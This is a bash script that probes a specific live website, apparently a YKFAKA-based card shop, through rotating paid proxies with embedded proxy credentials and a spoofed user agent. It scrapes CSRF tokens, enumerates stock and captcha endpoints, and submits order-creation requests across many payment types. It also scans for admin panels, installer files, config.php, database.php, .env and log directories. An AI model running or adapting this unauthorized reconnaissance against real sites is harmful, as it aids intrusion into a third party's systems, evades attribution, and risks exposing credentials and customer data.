#!/bin/bash
# tjqq.top YKFAKA deep — token query, Get_Yk_KC, Pay, captcha, unauth surfaces
set -u
KEY=C413ED6D; PWD=344F550A6F8B
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36'
BASE=https://tjqq.top
CK=/tmp/tjqq3.ck
OUT=/tmp/tjqq3_out
LOG=/tmp/tjqq3.log
rm -rf "$OUT"; mkdir -p "$OUT"; rm -f "$CK"
exec > >(tee "$LOG") 2>&1

refresh(){
  RESP=$(curl -s --connect-timeout 5 --max-time 10 "https://share.proxy.qg.net/get?key=${KEY}&num=1" || true)
  SERVER=$(python3 -c "import json,sys
try:
 d=json.loads(sys.argv[1]); print(d['data'][0]['server'] if d.get('code')=='SUCCESS' and d.get('data') else '')
except Exception:
 print('')" "$RESP")
  [[ -n "$SERVER" ]] && PROXY_URL="http://${KEY}:${PWD}@${SERVER}"
  echo "PROXY=$PROXY_URL"
}
c(){ curl -sk --connect-timeout 5 --max-time 25 -x "$PROXY_URL" -c "$CK" -b "$CK" -A "$UA" -e "$BASE/" "$@"; }

for i in 1 2 3 4 5 6; do
  refresh
  code=$(curl -sk --max-time 25 -x "$PROXY_URL" -c "$CK" -b "$CK" -A "$UA" -o "$OUT/home.html" -w "%{http_code}" "$BASE/")
  echo WARM=$code
  [[ "$code" == "200" ]] && break
done

echo "=== Get_Yk_KC stock API ==="
# from home JS typically posts ids
r=$(c -H 'X-Requested-With: XMLHttpRequest' -X POST -d 'id=2' "$BASE/Get_Yk_KC.html")
echo "KC id=2 => $r"
r=$(c -H 'X-Requested-With: XMLHttpRequest' -X POST -d 'gid=65' "$BASE/Get_Yk_KC.html")
echo "KC gid=65 => $r"
# try batch
for id in 2 3 5 6 36 37 43 52 55 56 61 62 65; do
  r=$(c -H 'X-Requested-With: XMLHttpRequest' -X POST -d "id=$id" "$BASE/Get_Yk_KC.html")
  echo "KC $id => ${r:0:200}"
done
# also GET
r=$(c "$BASE/Get_Yk_KC.html?id=2")
echo "KCGET => ${r:0:200}"

echo "=== Captcha / Geetest ==="
c "$BASE/Captcha" -o "$OUT/captcha.bin" -w "captcha=%{http_code}:%{size_download}:%{content_type}\n"
c "$BASE/Captcha?t=1" -o "$OUT/captcha2.bin" -w "captcha2=%{http_code}:%{size_download}:%{content_type}\n"
file "$OUT/captcha.bin" 2>/dev/null || true
# geetest init endpoints common in YKFAKA
for p in /Captcha /captcha /Geetest /geetest /Get_Geetest.html /Verify.html /User_Geetest.html /StartCaptchaServlet; do
  r=$(c -H 'X-Requested-With: XMLHttpRequest' "$BASE$p")
  [[ -n "$r" && "$r" != "404 - Not Found" && ${#r} -gt 20 ]] && echo "CAP $p => ${r:0:220}"
done

echo "=== Query with __token__ ==="
c "$BASE/Query.html" -o "$OUT/query.html" -w "qpage=%{http_code}\n"
python3 - <<'PY'
import re
h=open('/tmp/tjqq3_out/query.html',encoding='utf-8',errors='ignore').read()
tok=re.search(r'name="__token__"\s+value="([^"]+)"', h) or re.search(r'name=\'__token__\'\s+value=\'([^\']+)\'', h)
print('TOKEN', tok.group(1) if tok else None)
# fields
print('inputs', re.findall(r'name="([^"]+)"', h))
# JS submit
for m in re.finditer(r'.{0,40}(__token__|value|pass|layui\.form|url\s*:).{0,80}', h):
  print('CTX', m.group(0).replace('\n',' ')[:140])
if tok: open('/tmp/tjqq3_out/token.txt','w').write(tok.group(1))
# extract full form HTML
m=re.search(r'<form[\s\S]*?</form>', h)
if m: open('/tmp/tjqq3_out/query_form.html','w').write(m.group(0))
PY
TOKEN=$(cat "$OUT/token.txt" 2>/dev/null || true)
echo TOKEN_LEN=${#TOKEN}

# Query POST with token - try field combos
for data in \
  "__token__=$TOKEN&value=123456&pass=123456" \
  "__token__=$TOKEN&value=123456" \
  "__token__=$TOKEN&value=20260803100000000&pass=123456" \
  "__token__=$TOKEN&value=test&pass=test&page=1"; do
  r=$(c -H 'X-Requested-With: XMLHttpRequest' -H 'Content-Type: application/x-www-form-urlencoded' \
    -e "$BASE/Query.html" -X POST -d "$data" "$BASE/Query.html")
  echo "Q [$data] => ${r:0:300}"
done

echo "=== Gd_Query with value ==="
c "$BASE/Gd_Query.html" -o "$OUT/gd.html"
GTOK=$(python3 -c "import re;h=open('/tmp/tjqq3_out/gd.html',encoding='utf-8',errors='ignore').read();m=re.search(r'name=\"__token__\"\s+value=\"([^\"]+)\"',h);print(m.group(1) if m else '')")
r=$(c -H 'X-Requested-With: XMLHttpRequest' -X POST -d "value=QQ&__token__=$GTOK" "$BASE/Gd_Query.html")
echo "GD => ${r:0:400}"
r=$(c -H 'X-Requested-With: XMLHttpRequest' -X POST -d "value=国卡" "$BASE/Gd_Query.html")
echo "GD2 => ${r:0:400}"

echo "=== Trade/Pay flow ==="
c "$BASE/Trade/56.html" -o "$OUT/trade56.html" -w "t56=%{http_code}\n"
python3 - <<'PY'
import re
h=open('/tmp/tjqq3_out/trade56.html',encoding='utf-8',errors='ignore').read()
print('token', re.search(r'name="__token__"\s+value="([^"]+)"',h).group(1) if re.search(r'name="__token__"',h) else None)
print('inputs', re.findall(r'<input[^>]+>', h)[:20])
print('paytypes', re.findall(r'paytype[^<]{0,80}', h)[:10])
print('gid', re.findall(r'name="gid"[^>]*value="([^"]+)"|value="([^"]+)"[^>]*name="gid"', h)[:5])
# price stock
text=re.sub(r'<[^>]+>',' ',h)
text=re.sub(r'\s+',' ',text)
print('text', text[:500])
tok=re.search(r'name="__token__"\s+value="([^"]+)"',h)
gid=re.search(r'name="gid"[^>]*value="(\d+)"',h) or re.search(r'value="(\d+)"[^>]*name="gid"',h)
if tok: open('/tmp/tjqq3_out/pay_token.txt','w').write(tok.group(1))
if gid: open('/tmp/tjqq3_out/gid.txt','w').write(gid.group(1))
# pass placeholder
print('pass placeholders', re.findall(r'name="pass"[^>]*>', h))
PY
PTOKEN=$(cat "$OUT/pay_token.txt" 2>/dev/null || true)
GID=$(cat "$OUT/gid.txt" 2>/dev/null || echo 56)
# create unpaid order via /Pay
for paytype in 1 2 3 alipay wxpay qqpay usdt balance rmb; do
  r=$(c -L --max-redirs 0 -H 'Content-Type: application/x-www-form-urlencoded' \
    -e "$BASE/Trade/56.html" -X POST \
    --data-urlencode "paytype=$paytype" --data-urlencode "gid=$GID" --data-urlencode "count=1" \
    --data-urlencode "pass=tjtest$(date +%H%M%S)" --data-urlencode "__token__=$PTOKEN" \
    -o "$OUT/pay_$paytype.html" -w "%{http_code}:%{redirect_url}:%{size_download}" \
    "$BASE/Pay")
  body=$(head -c 200 "$OUT/pay_$paytype.html" | tr '\n' ' ')
  echo "PAY type=$paytype => $r $body"
done

echo "=== YKFAKA known path enum ==="
for p in \
  /Admin_Login.html /Admin.html /Admin_Index.html \
  /Install/ /install/index.html /install.lock \
  /Get_Yk_KC.html /Get_Goods.html /Get_Order.html \
  /Order_Info.html /Order_List.html /Kami_List.html \
  /User_Kami.html /User_Order.html /User_Pay.html \
  /Notify.html /Notify_Url.html /Return_Url.html \
  /Pay_Notify.html /Pay_Return.html /Epay_Notify.html \
  /config.php /database.php /application/database.php \
  /runtime/log/ /public/uploads/ /.env \
  /Api_Goods.html /Api_Order.html /api.php \
  /User_Ajax_Login.html /Ajax_Login.html; do
  code=$(c -o /tmp/tj_pb -w "%{http_code}:%{size_download}" "$BASE$p")
  sz=$(echo "$code"|cut -d: -f2)
  if [[ "$sz" != "15" ]]; then
    echo "P $p => $code $(head -c 100 /tmp/tj_pb | tr '\n' ' ')"
  fi
done

echo "=== login page captcha detail ==="
c "$BASE/User_Login.html" -o "$OUT/login.html"
python3 - <<'PY'
import re
h=open('/tmp/tjqq3_out/login.html',encoding='utf-8',errors='ignore').read()
print(h)
PY

echo "===== PROBE3 DONE ====="
